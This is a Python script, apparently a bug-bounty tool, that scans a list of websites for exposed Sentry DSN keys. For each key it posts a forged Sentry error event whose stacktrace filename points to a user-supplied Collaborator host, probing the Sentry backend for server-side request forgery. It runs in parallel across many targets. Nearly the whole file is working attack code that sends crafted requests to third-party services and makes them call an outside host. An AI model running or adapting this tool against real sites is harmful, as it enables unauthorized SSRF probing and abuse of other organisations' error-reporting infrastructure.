import requests
import re
import argparse
import multiprocessing as mp
import os
import time
import pprint

# cpus
cpus = mp.cpu_count()

parser = argparse.ArgumentParser(description='')
parser.add_argument('--file', help="File of urls to check (in format http(s)://example.com)", required=True)
parser.add_argument('--payload', help='Collaborator link', type=str, required=True)
parser.add_argument('--threads', help='Number of threads (defaults to cpu core count)', type=int, default=cpus)
args = parser.parse_args()

CRED = '\033[91m'
CEND = '\033[0m'
CGREENBG  = '\033[32m'

url = ""

def sentry_check(links):
    for link in links:
        try:
            url = requests.get(link)
            if url and url.status_code == 200: 
                resp = url.text
                regex = re.findall(r'https://[0-9a-f]*@[a-z0-9]+\.[a-z]+.?[0-9]+', resp)
                if regex:
                    for url_link in regex:
                        key = re.search('https://(.*)@', url_link)
                        domain = re.search('@(.*)/', url_link)
                        number = re.search('/(.*)', url_link[8:])
                        collaborator = link + '.' + args.payload
                        url = "https://" + domain.group(1) + "/api/" + number.group(1) + "/store/?sentry_key=" + key.group(1) + "&sentry_version=7"
                        datas = {"extra":{"component":"redux/actions/index","action":"RegisterDeviceWeb","serialized":{"code":"INVALID_CREDENTIALS","details":[]}},"fingerprint":["3cbf661c7f723b0a5816c16968fd9493","Non-Error exception captured with keys: code, details, message"],"message":"Non-Error exception captured with keys: code, details, message","stacktrace":{"frames":[{"colno":218121,"filename":collaborator,"function":"?","lineno":1}]},"exception":{"values":[{"value":"Custom Object","type":"Error"}]},"event_id":"d0513ec5a3544e05aef0d1c7c5b24bae","platform":"javascript","sdk":{"name":"sentry.javascript.browser","packages":[{"name":"npm:@sentry/browser","version":"4.6.4"}],"version":"4.6.4"},"release":"6225dd99","user":{"phash":"996a3f4661e02cb505ae0daf406555e9b914f9d43d635c52cfc7485046862a7f"},"breadcrumbs":[{"timestamp":1554226659.455,"category":"navigation","data":{"from":"/","to":"/login"}}]}
                        headers = {'Content-type': 'application/json', 'Origin':'https://z.tochka.com/'}
                        rsp = requests.post(url, json=datas, headers=headers)
                        print(CGREENBG + "[+]" + CEND + "({}) Sentry endpoint found!  Payload sent to {}".format(mp.current_process().name, link))
                else:
                    print(CRED + "[+]" + CEND + "({}) No Sentry endpoint found in {}".format(mp.current_process().name, link))
            else:
                print(CRED + "[!]" + CEND + "({}) Unfavorable status code {} returned: {}".format(mp.current_process().name, url.status_code, link))
        except requests.exceptions.ConnectionError:
            pass

# break lists up into n
def divide_chunks(l, n):
    for i in range(0, len(l), n):
        yield l[i:i + n]

def main():
    global found_count
    starttime = time.time()
    processes = []

    # make a big list of the links
    linkList = list()
    linkList = [line.strip('\n') for line in open(args.file, "r")]

    # remove any potential duplicats in the list
    linkList = list(dict.fromkeys(linkList))

    # divide big list into 5 small ones
    links = list(divide_chunks(linkList, args.threads))
    #pprint.pprint(list(divide_chunks(linkList, args.threads)))

    for i in range(0, len(links)):
        p = mp.Process(target=sentry_check, args=(links[i],))
        processes.append(p)
        p.start()
    
    for process in processes:
        process.join()

    # end text
    print(CGREENBG + "[!]" + CEND + " Finished in {} seconds".format(time.time() - starttime))
    
if __name__ == "__main__":
    main()
